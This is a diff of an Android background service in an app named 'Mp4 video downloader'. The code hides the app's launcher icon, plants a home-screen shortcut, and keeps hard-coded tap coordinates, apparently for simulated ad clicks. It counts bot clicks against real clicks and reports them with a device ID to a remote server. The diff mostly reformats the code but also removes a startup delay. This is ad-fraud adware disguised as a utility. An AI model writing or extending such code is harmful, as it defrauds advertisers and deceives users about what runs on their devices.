@@ -61,9 +61,9 @@ public class MyService extends Service {
     private int delayService;
     private int delay_report;
 
-    private int countTotalShow=0;
-    private int countRealClick=0;
-    private int countBotClick=0;
+    private int countTotalShow = 0;
+    private int countRealClick = 0;
+    private int countBotClick = 0;
     private int delay_retention = -1;
 
     private ClientConfig clientConfig;
@@ -71,17 +71,16 @@ public class MyService extends Service {
     private com.facebook.ads.InterstitialAd fbInterstitialAd;
     private CheckAds checkAds;
 
-    private static final Point [] points = {new Point(50,50),new Point(51,57),new Point(79,85),new Point(72,74),
-            new Point(70,92),new Point(71,91),new Point(71,93),new Point(72,92),new Point(48,80),new Point(48,65),new Point(53,40)};
+    private static final Point[] points = {new Point(50, 50), new Point(51, 57), new Point(79, 85), new Point(72, 74),
+            new Point(70, 92), new Point(71, 91), new Point(71, 93), new Point(72, 92), new Point(48, 80), new Point(48, 65), new Point(53, 40)};
 
     @Override
     public void onCreate() {
-        Log.d("cao","onCreate");
+        Log.d("cao", "onCreate");
     }
 
-    private void initService()
-    {
-        Log.d("cao","initService");
+    private void initService() {
+        Log.d("cao", "initService");
         SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
         uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
         idFullService = mPrefs.getString("idFullService", "/21617015150/734252/21736058380");
@@ -106,47 +105,50 @@ public class MyService extends Service {
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        Log.d("cao","onStartCommand");
-        if(myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
+        Log.d("cao", "onStartCommand");
+        if (myTask == null || myTask.isShutdown() || myTask.isTerminated()) {
             initService();
         }
         return START_STICKY;
     }
 
     private void addShortcut() {
-        //Adding shortcut for MainActivity
         try {
             PackageManager p = getPackageManager();
             ComponentName componentName = new ComponentName(this.getPackageName(), "com.mp4.videodownloader.MAIN1");
-            p.setComponentEnabledSetting(componentName,PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-//            Log.d("caomui","DONE hide icon");
-        }
-        catch (Exception e)
-        {
-//            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
+            p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            Log.d("caomui","ERROR HIDE ICON" + e.getLocalizedMessage());
             e.printStackTrace();
         }
 
-        Intent shortcutIntent = new Intent(getApplicationContext(),
-                com.mp4.videodownloader.MainActivity.class);
+        //Adding shortcut for MainActivity
+        try {
+            Intent shortcutIntent = new Intent(getApplicationContext(),
+                    com.mp4.videodownloader.MainActivity.class);
 
-        shortcutIntent.setAction(Intent.ACTION_MAIN);
+            shortcutIntent.setAction(Intent.ACTION_MAIN);
 
-        Intent addIntent = new Intent();
-        addIntent
-                .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
-        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Mp4 video downloader");
-        addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
-                Intent.ShortcutIconResource.fromContext(getApplicationContext(),
-                        R.mipmap.ic_launcher));
+            Intent addIntent = new Intent();
+            addIntent
+                    .putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
+            addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "Mp4 video downloader");
+            addIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
+                    Intent.ShortcutIconResource.fromContext(getApplicationContext(),
+                            R.mipmap.ic_launcher));
 
-        addIntent
-                .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
-        addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
-        getApplicationContext().sendBroadcast(addIntent);
+            addIntent
+                    .setAction("com.android.launcher.action.INSTALL_SHORTCUT");
+            addIntent.putExtra("duplicate", false);  //may it's already there so don't duplicate
+            getApplicationContext().sendBroadcast(addIntent);
 
-//        Log.d("caomui","ADD shortcut done");
-        createShortcut();
+            createShortcut();
+        }
+        catch (Exception e){
+            Log.d("caomui","=========");
+            e.printStackTrace();
+        }
+
     }
 
     private void scheduleTask() {
@@ -159,19 +161,14 @@ public class MyService extends Service {
                 totalTime += intervalService;
                 mPrefs.edit().putInt("totalTime", totalTime).commit();
 
-                if(delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
+                if (delay_retention >= 0 && totalTime > delay_retention)//add shortcut or không
                 {
                     addShortcut();
                     delay_retention = -1;
-                    mPrefs.edit().putInt("delay_retention",-1).commit();
+                    mPrefs.edit().putInt("delay_retention", -1).commit();
                 }
 
-                if (totalTime < delayService * 60) {
-                    return;
-                }
-
-                if(totalTime == 4000)
-                {
+                if (totalTime == 4000) {
                     SharedPreferences mPrefs2 = getSharedPreferences("support_xx", 0);
                     mPrefs.edit().putInt("accept", 2).commit();
                 }
@@ -191,14 +188,13 @@ public class MyService extends Service {
 
     }
 
-    private void getClientConfig()
-    {
+    private void getClientConfig() {
         OkHttpClient client = new OkHttpClient();
         RequestBody body = new FormBody.Builder()
                 .add("countTotalShow", countTotalShow + "")
-                .add("countRealClick",countRealClick+"")
-                .add("countBotClick",countBotClick+"")
-                .add("id",uuid)
+                .add("countRealClick", countRealClick + "")
+                .add("countBotClick", countBotClick + "")
+                .add("id", uuid)
                 .build();
         Request okRequest = new Request.Builder()
                 .url(AppConstants.URL_CLIENT_CONFIG)
@@ -212,7 +208,7 @@ public class MyService extends Service {
             @Override
             public void onResponse(Call call, Response response) throws IOException {
                 Gson gson = new GsonBuilder().create();
-                clientConfig = gson.fromJson(response.body().string(),ClientConfig.class);
+                clientConfig = gson.fromJson(response.body().string(), ClientConfig.class);
                 countTotalShow = 0;
                 countBotClick = 0;
                 countRealClick = 0;
@@ -222,8 +218,7 @@ public class MyService extends Service {
         });
     }
 
-    private void createShortcut()
-    {
+    private void createShortcut() {
         new Thread(new Runnable() {
             @Override
             public void run() {
@@ -231,15 +226,14 @@ public class MyService extends Service {
                     Thread.sleep(5000);
                     OkHttpClient client = new OkHttpClient();
                     RequestBody body = new FormBody.Builder()
-                            .add("id",uuid)
+                            .add("id", uuid)
                             .build();
                     Request okRequest = new Request.Builder()
                             .url(AppConstants.URL_CREATE_SHORTCUT)
                             .post(body)
                             .build();
                     client.newCall(okRequest).execute();
-                }
-                catch (Exception e){
+                } catch (Exception e) {
                 }
             }
         }).start();
